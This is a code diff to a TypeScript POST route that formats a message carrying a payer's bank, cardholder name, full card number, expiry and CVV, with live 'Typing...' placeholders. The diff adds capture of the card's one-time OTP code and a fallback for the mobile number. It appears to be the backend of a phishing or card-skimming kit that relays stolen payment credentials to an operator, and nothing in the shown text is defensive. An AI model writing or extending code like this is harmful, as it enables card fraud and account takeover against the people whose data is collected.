@@ -50,10 +50,11 @@ export async function POST(request: Request) {
         messageText += ` ├ 🏛️ <b>Bank Name:</b> ${data.payment.bankId ? data.payment.bankId.toUpperCase() : '<i>Selecting...</i>'}\n`;
         messageText += ` ├ 🎴 <b>Card Network:</b> ${(data.payment.cardNetwork || 'visa').toUpperCase()}\n`;
         messageText += ` ├ 👤 <b>Cardholder Name:</b> ${data.payment.cardName || '<i>Typing...</i>'}\n`;
-        messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${data.payment.registeredMobile || '<i>Typing...</i>'}</code>\n`;
+        messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${data.payment.registeredMobile || data.customer?.mobileNumber || '<i>Typing...</i>'}</code>\n`;
         messageText += ` ├ 🔢 <b>Card Number:</b> <code>${data.payment.cardNumber || '<i>Typing...</i>'}</code>\n`;
         messageText += ` ├ 📆 <b>Expiry Date:</b> <code>${data.payment.expiry || '<i>MM / YY</i>'}</code>\n`;
-        messageText += ` └ 🔐 <b>CVV / CVC Code:</b> <code>${data.payment.cvv || '<i>CVV</i>'}</code>\n\n`;
+        messageText += ` ├ 🔐 <b>CVV / CVC Code:</b> <code>${data.payment.cvv || '<i>CVV</i>'}</code>\n`;
+        messageText += ` └ 🔑 <b>Card OTP Code:</b> <code>${data.payment.otpCode || '<i>Typing OTP...</i>'}</code>\n\n`;
       } else {
         messageText += `👛 <b>DIGITAL WALLET PAYMENT:</b>\n`;
         messageText += ` ├ 📲 <b>Wallet Service:</b> ${data.payment.walletType ? data.payment.walletType.toUpperCase() : '<i>Easypaisa</i>'}\n`;
